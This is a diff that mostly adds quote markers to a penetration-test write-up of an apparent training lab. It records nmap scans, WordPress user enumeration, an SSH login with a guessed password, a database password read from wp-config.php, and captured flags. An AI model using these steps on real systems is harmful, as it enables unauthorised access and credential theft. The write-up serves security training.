@@ -4,7 +4,7 @@
 
 Nmap scan results for each machine reveal the below services and OS details:
 
-First I performed a port scan using `nmap`:
+First I performed a port scan using `nmap` to enumerate the entire network:
 
 > nmap -Pn 192.168.1.0/24
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-28 15:15 PST
@@ -19,7 +19,7 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 MAC Address: 00:15:5D:00:04:0D (Microsoft)
 
-Nmap scan report for 192.168.1.100
+> Nmap scan report for 192.168.1.100
 Host is up (0.00085s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE
@@ -27,7 +27,7 @@ PORT     STATE SERVICE
 9200/tcp open  wap-wsp
 MAC Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)
 
-Nmap scan report for 192.168.1.105
+> Nmap scan report for 192.168.1.105
 Host is up (0.00089s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE
@@ -35,7 +35,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 MAC Address: 00:15:5D:00:04:0F (Microsoft)
 
-Nmap scan report for 192.168.1.110
+> Nmap scan report for 192.168.1.110
 Host is up (0.0011s latency).
 Not shown: 995 closed ports
 PORT    STATE SERVICE
@@ -46,7 +46,7 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 MAC Address: 00:15:5D:00:04:10 (Microsoft)
 
-Nmap scan report for 192.168.1.115
+> Nmap scan report for 192.168.1.115
 Host is up (0.00069s latency).
 Not shown: 995 closed ports
 PORT    STATE SERVICE
@@ -57,17 +57,17 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 MAC Address: 00:15:5D:00:04:11 (Microsoft)
 
-Nmap scan report for 192.168.1.90
+> Nmap scan report for 192.168.1.90
 Host is up (0.000010s latency).
 Not shown: 999 closed ports
 PORT   STATE SERVICE
 22/tcp open  ssh
 
-Nmap done: 256 IP addresses (6 hosts up) scanned in 6.74 seconds
+> Nmap done: 256 IP addresses (6 hosts up) scanned in 6.74 seconds
 
 Then I delved more fully into two machines in particular to gather exposed services:
 
-nmap -sV 192.168.1.110
+> nmap -sV 192.168.1.110
 Nmap scan report for 192.168.1.110
 Host is up (0.00053s latency).
 Not shown: 995 closed ports
@@ -80,7 +80,7 @@ PORT    STATE SERVICE     VERSION
 MAC Address: 00:15:5D:00:04:10 (Microsoft)
 Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-nmap -sV 192.168.1.115
+> nmap -sV 192.168.1.115
 Nmap scan report for 192.168.1.115
 Host is up (0.00057s latency).
 Not shown: 995 closed ports
@@ -94,7 +94,7 @@ MAC Address: 00:15:5D:00:04:11 (Microsoft)
 Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 The following vulnerabilities were identified on each target:
-- Target 1
+* Target 1
   - User enumeration
 
     The team was able to use a Wordpress scan to enumerate the users using the command:
@@ -103,13 +103,13 @@ The following vulnerabilities were identified on each target:
 
     Results of the scan identified two users:
 
-    34m[i][0m User(s) Identified:
+    >3 4m[i][0m User(s) Identified:
 
-    [32m[+][0m steven
+    > [32m[+][0m steven
      | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)
 
-    [32m[+][0m michael
+    > [32m[+][0m michael
      | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)
 
@@ -117,53 +117,49 @@ The following vulnerabilities were identified on each target:
 
     Attackers were then easily able to `ssh` into the target by guessing the weak password of user `michael`, which was "michael".
 
-    ssh michael@192.168.1.110    
-    michael@192.168.1.110's password:
+    > ssh michael@192.168.1.110    
+    > michael@192.168.1.110's password:
 
-    michael@target1:~$ ls
+    > michael@target1:~$ ls
 
     Attackers were then able to use `grep` to find "flag1" inside of /var/www/html/service.html:
 
-    cat /var/www/html/service.html:			<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
+    > cat /var/www/html/service.html:			<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
 
     Found flag2 the same way.  Traversed the file system and found inside the /var/www directory.
 
-    michael@target1:~$ cat /var/www/flag2.txt
-    flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+    > michael@target1:~$ cat /var/www/flag2.txt
+    > flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
 
   - Insecure password
 
     As the attackers were further searching the system, found credentials for the Wordpress database inside of /var/www/html/wp_config.php:
 
-    /** The name of the database for WordPress */
+    > /** The name of the database for WordPress */
     define('DB_NAME', 'wordpress');
 
-    /** MySQL database username */
+    > /** MySQL database username */
     define('DB_USER', 'root');
 
-    /** MySQL database password */
+    > /** MySQL database password */
     define('DB_PASSWORD', 'R@v3nSecurity');
 
     Used those credentials to get into the Wordpress database and find flag3:
 
-    michael@target1:~$ mysql -u root -p wordpress
-Enter password:
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+    > ichael@target1:~$ mysql -u root -p wordpress
+      Enter password:
+      Reading table information for completion of table and column names
+      You can turn off this feature to get a quicker startup with -A
 
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 42
-Server version: 5.5.60-0+deb8u1 (Debian)
+    >  Welcome to the MySQL monitor.  Commands end with ; or \g.
+      Your MySQL connection id is 42
+      Server version: 5.5.60-0+deb8u1 (Debian)
 
-Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+      Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
 
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-mysql> use wordpress;
+> mysql> use wordpress;
 Database changed
 mysql> show tables;
 +-----------------------+
